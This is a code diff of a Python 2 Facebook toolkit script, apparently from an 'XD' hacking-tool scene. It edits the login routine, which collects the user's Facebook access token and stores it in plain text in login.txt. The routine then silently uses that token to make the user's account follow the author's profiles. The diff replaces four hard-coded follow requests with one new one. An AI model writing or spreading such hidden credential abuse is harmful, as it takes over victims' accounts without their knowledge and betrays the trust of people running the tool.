@@ -87,7 +87,6 @@ def logo():
 \033[1;93m➤\033[1;97m Instagram  : \033[1;92mraka_andrian27 \033[1;97m
 \033[1;93m➤\033[1;97m Twitter    : \033[1;92mBangsat_XD \033[1;97m
     \033[1;95m──────═• \033[1;92m● \033[1;95m══════════════════════════════ \033[1;92m● \033[1;97m\033[1;95m•═──────     """)
-
 def login():
 	os.system("clear")
 	try:
@@ -99,19 +98,19 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError, IOError:
-		token = raw_input("\033[1;93m➤ \033[1;92m☆ Enter TOKEN ☆ ™︻®╤───────═◍➤ : ")
+		token = raw_input("[?] Enter Token : ")
 		if token == "":
 			print("Wrong Input")
 		try:
+			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
+			open("login.txt", "w").write(token)
 			#-> bot follow
-			requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)      # Raka Andrian Tara
-			requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token="+token)      # RAKA THE KING
-			requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token="+token)      # MANTAN GARANGAN
-			requests.post("https://graph.facebook.com/532301703502197/subscribers?access_token="+token)      # Pansfage
+			requests.post("https://graph.facebook.com/4/subscribers?access_token="+token)      # Dapunta Khurayra X
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
 			exit("[?] Login Error")
+
 # Menu Raka Andrian Tara
 def menu():
 	os.system("clear")
